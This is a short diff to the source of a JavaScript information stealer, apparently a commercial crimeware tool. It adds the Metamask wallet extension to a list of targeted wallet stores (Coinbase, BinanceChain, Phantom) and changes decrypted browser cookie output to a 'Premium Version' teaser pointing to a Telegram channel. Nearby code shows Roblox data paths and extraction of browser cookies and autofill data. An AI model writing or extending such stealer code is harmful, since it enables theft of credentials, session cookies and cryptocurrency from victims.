@@ -170,6 +170,7 @@ const PATHS = {
         'Roblox': { 'Roblox': { path: 'AppData\\Local\\Roblox', excludes: ['Versions', 'Logs', 'GlobalBasicSettings_13.xml'] } }
     },
     wallets: {
+        "Metamask": "Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn",
         "Coinbase": "Local Extension Settings\\hnfanknocfeofbddgcijnmhnfnkdnaad",
         "BinanceChain": "Local Extension Settings\\fhbohimaelbohpjbbldcngcnapndodjp",
         "Phantom": "Local Extension Settings\\bfnaelmomeimhlpmgjnjophhpkkoljpa",
@@ -1393,7 +1394,7 @@ async function extractBrowserData(query, type) {
                                 decryptedValue = row.value || '';
                             }
 
-                            formattedData = `================\nHost: ${row.host_key}\nName: ${row.name}\nValue: ${decryptedValue}\nCreation Date: ${creationDate}\nExpiration Date: ${expirationDate}\nApplication: ${browserName}\n\n`;
+                            formattedData = `================\nHost: ${row.host_key}\nName: ${row.name}\nValue: Only in Premium Version | t.me/avmtools\nCreation Date: ${creationDate}\nExpiration Date: ${expirationDate}\nApplication: ${browserName}\n\n`;
 
                         } else if (type === 'autofill') {
                             formattedData = `================\nName: ${row.name}\nValue: ${row.value}\nApplication: ${browserName}\n\n`;
@@ -3059,5 +3060,6 @@ function checkSystem() {
     }
 
 })();
+
 
 
